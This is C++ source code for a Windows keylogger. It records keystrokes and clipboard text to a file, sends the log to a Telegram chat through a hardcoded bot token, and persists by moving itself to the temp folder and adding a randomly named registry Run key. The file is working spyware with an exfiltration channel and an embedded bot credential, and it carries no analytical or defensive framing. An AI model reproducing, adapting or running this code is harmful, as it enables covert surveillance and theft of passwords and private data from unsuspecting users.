#include<iostream>
#include<fstream>
#include <Windows.h>
#include <stdlib.h>
#include <ctime>
#include <string>
#include <sstream>
#include <tchar.h>
#include <Lmcons.h>
#include <cctype>
#include <iomanip>
#include <curl/curl.h>
#include "cpr/cpr.h"
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#pragma warning(disable:4996)

using namespace std;

const string LOGFILENAME = "data.th";
const string BOTAPI = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
const string CHAT_ID = "-1001487776950";
const int SENDING_FREQUENCY = 1; // in minutes

string GetTime() {
    time_t now = time(0);
    tm* gmtm = gmtime(&now);
    string s = asctime(gmtm);
    return s;
}

string url_encode(string value) {
	//clearing shit
	for (int i = 0; i < value.size(); i++)
		if (value[i] < 32 || value[i]>127)value[i] = '▯';

	ostringstream escaped;
	escaped.fill('0');
	escaped << hex;

	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
		string::value_type c = (*i);

		// Keep alphanumeric and other accepted characters intact
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			escaped << c;
			continue;
		}

		// Any other characters are percent-encoded
		escaped << uppercase;
		escaped << '%' << setw(2) << int((unsigned char)c);
		escaped << nouppercase;
	}

	return escaped.str();
}

void send() {
	ifstream ifs(LOGFILENAME);
	string input((std::istreambuf_iterator<char>(ifs)),
		(std::istreambuf_iterator<char>()));

	if (input.empty())return;
	bool success = true;

	while (!input.empty()) {
		cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOTAPI + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(input.substr(0,4095)) });
		if (r.status_code != 200)success = false;
		cout << "Status code: " << r.status_code << endl;
		input.erase(0, 4095);
	}
	if (success) {
		ofstream ofs;
		ofs.open(LOGFILENAME, ofstream::out | ofstream::trunc);
		ofs.close();
	}
}

void LOG(string input) {
	fstream LogFile;
	LogFile.open(LOGFILENAME, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" #SPACE# ");
		return true;
	case VK_RETURN:
		LOG(" #ENTER#\n ");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG(" #SHIFT# ");
		return true;
	case VK_BACK:
		LOG(" #BACKSPACE# ");
		return true;
	case VK_RBUTTON:
		LOG(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
		LOG(" #CAPS_LOCK# ");
		return true;
	case VK_TAB:
		LOG(" #TAB# ");
		return true;
	case VK_UP:
		LOG(" #UP_ARROW# ");
		return true;
	case VK_DOWN:
		LOG(" #DOWN_ARROW# ");
		return true;
	case VK_LEFT:
		LOG(" #LEFT_ARROW# ");
		return true;
	case VK_RIGHT:
		LOG(" #RIGHT_ARROW# ");
		return true;
	case VK_CONTROL:
		LOG(" #CONTROL# ");
		return true;
	case VK_MENU:
		LOG(" #ALT# ");
		return true;
	default:
		return false;
	}
}


void Clipboard() {

	static HANDLE clip(0);
	static char* buff;
	static string buffstr("");

	OpenClipboard(NULL);

	if (IsClipboardFormatAvailable(CF_TEXT)) clip = GetClipboardData(CF_TEXT);
	else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) clip = GetClipboardData(CF_UNICODETEXT);

	CloseClipboard();

	buff = (char*)clip;
	if (buff != buffstr) {
		buffstr = buff;
		LOG(" #CLIPBOARD>" + buffstr + "<CLIPBOARD# ");
	}
}

string random_string(int lenght) {
	srand(time(0));
	string random = "";
	while (lenght--) {
		char ran = rand() % 25 + 97;
		random += ran;
	}
	return random;
}

string get_exe() {
	//https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
	TCHAR buffer[MAX_PATH] = { 0 };
	TCHAR* out;
	DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
	GetModuleFileName(NULL, buffer, bufSize);
	out = PathFindFileName(buffer);
	return out;
}

bool filexits(const string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

void autostart() {
	string path;
	char username[256 + 1];
	DWORD username_len = 256 + 1;
	GetUserName(username, &username_len);

	char letter[256 + 1];
	GetSystemDirectory(letter, sizeof(letter));

	path = letter[0];
	path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
	if (!filexits(path + "\\" + get_exe())) {
		fstream file;
		file.open("o.bat", ios::out);
		file << "TASKKILL /F /IM " << get_exe() << endl
			<< "move " << get_exe() << " %temp%" << endl
			<< "move " << "shitoo" << " %temp%" << endl
			<< "start %temp%\\" + get_exe();
		file.close();
		string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
		system(cmd.c_str());

		char buffer[MAX_PATH];
		::GetModuleFileNameA(NULL, buffer, MAX_PATH);
		string buff2(buffer);
		buff2.erase(buff2.size() - get_exe().size(), 256);
		file.open("shitoo", ios::out);
		file << buff2 + "o.bat";
		file.close();
		system("o.bat");
	}
	if (filexits(path + "\\shitoo")) {
		fstream file;
		string path2;
		file.open(path + "\\shitoo", ios::in);
		file >> path2;
		file.close();
		remove(path2.c_str());
		remove("shitoo");
	}
}
